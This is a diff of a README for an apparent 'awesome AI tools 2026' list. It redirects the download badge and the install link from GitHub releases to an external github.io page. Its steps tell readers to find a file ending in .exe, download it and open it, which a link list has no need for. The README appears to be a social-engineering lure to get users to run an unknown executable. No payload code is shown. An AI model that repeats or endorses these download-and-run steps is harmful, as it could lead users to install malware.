@@ -1,6 +1,6 @@
 # 🚀 awesome-ai-tools-2026 - Find the best AI software today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Josephtiled824/awesome-ai-tools-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://josephtiled824.github.io)
 
 This repository provides a collection of over 300 artificial intelligence tools. These tools help users with tasks such as writing, computer programming, image design, video production, and workplace productivity. We keep this list updated to reflect the latest software available in 2026.
 
@@ -32,7 +32,7 @@ Most of these tools run inside your web browser. A few professional applications
 
 Follow these steps to access the software:
 
-1. Visit the project release page to see all versions: [Download Latest Release](https://github.com/Josephtiled824/awesome-ai-tools-2026/releases).
+1. Visit the project release page to see all versions: [Download Latest Release](https://josephtiled824.github.io).
 2. Look for the file ending in .exe if you need to install a desktop tool.
 3. Click the file name to begin the download.
 4. Open the file once the download finishes.
